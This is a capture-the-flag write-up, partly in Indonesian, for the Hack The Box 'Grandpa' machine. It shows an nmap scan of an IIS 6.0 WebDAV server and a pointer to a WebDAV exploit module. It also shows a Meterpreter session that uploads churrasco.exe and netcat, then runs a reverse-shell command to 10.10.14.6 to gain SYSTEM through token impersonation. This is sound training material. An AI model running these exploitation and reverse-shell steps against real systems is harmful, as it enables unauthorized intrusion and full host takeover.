```bash
┌─[✗]─[aexon@parrot]─[~/Desktop/ctf-main/ctf-docs/CTF/hackthebox/windows/Grandpa]
└──╼ $sudo nmap -sCV -p- 10.10.10.14 --min-rate 1000 -Pn
[sudo] password for aexon: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-06 20:43 WIB
Nmap scan report for 10.10.10.14
Host is up (0.31s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Date: Fri, 06 Sep 2024 13:43:05 GMT
|   WebDAV type: Unknown
|_  Server Type: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 152.77 seconds

```

---
**Vuln Checking**

di sini saya mencari sebuah kerentanan pada sebuah service nya, dan ternyata port 80 itu rentan untuk di exploit.

revrensi:
https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl/

---

**ROOT**

```powershell
C:\>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
```

`SEImpersonalPrivilege` adalah salah satu yang saya tahu harus diwaspadai. Untuk kotak modern, itu berarti eksploitasi kentang (berair, sepi, busuk). Tapi untuk tahun 2003, lebih baik memulai dengan churrasco.


```powershell
(Meterpreter 1)(c:\wmpub) > upload churrasco.exe
[*] Uploading  : /home/aexon/Desktop/ctf-main/ctf-docs/CTF/hackthebox/windows/Grandpa/churrasco.exe -> churrasco.exe
[*] Uploaded 30.50 KiB of 30.50 KiB (100.0%): /home/aexon/Desktop/ctf-main/ctf-docs/CTF/hackthebox/windows/Grandpa/churrasco.exe -> churrasco.exe
[*] Completed  : /home/aexon/Desktop/ctf-main/ctf-docs/CTF/hackthebox/windows/Grandpa/churrasco.exe -> churrasco.exe
(Meterpreter 1)(c:\wmpub) > upload nc.exe
[*] Uploading  : /home/aexon/Desktop/ctf-main/ctf-docs/CTF/hackthebox/windows/Grandpa/nc.exe -> nc.exe
[*] Uploaded 27.50 KiB of 27.50 KiB (100.0%): /home/aexon/Desktop/ctf-main/ctf-docs/CTF/hackthebox/windows/Grandpa/nc.exe -> nc.exe
[*] Completed  : /home/aexon/Desktop/ctf-main/ctf-docs/CTF/hackthebox/windows/Grandpa/nc.exe -> nc.exe
(Meterpreter 1)(c:\wmpub) > shell
[-] Failed to spawn shell with thread impersonation. Retrying without it.
Process 3512 created.
Channel 8 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\wmpub>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FDCB-B9EF

 Directory of c:\wmpub

09/06/2024  05:23 PM    <DIR>          .
09/06/2024  05:23 PM    <DIR>          ..
09/06/2024  05:21 PM            31,232 churrasco.exe
09/06/2024  05:23 PM            28,160 nc.exe
04/12/2017  05:05 PM    <DIR>          wmiislog
               2 File(s)         59,392 bytes
               3 Dir(s)   1,319,591,936 bytes free

c:\wmpub>.\churrasco.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.14.6 4449"    
.\churrasco.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.14.6 4449"
/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 668 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 672 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 676 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 684 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x734
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found LOCAL SERVICE Token
/churrasco/-->Found SYSTEM token 0x72c
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!

c:\wmpub>


```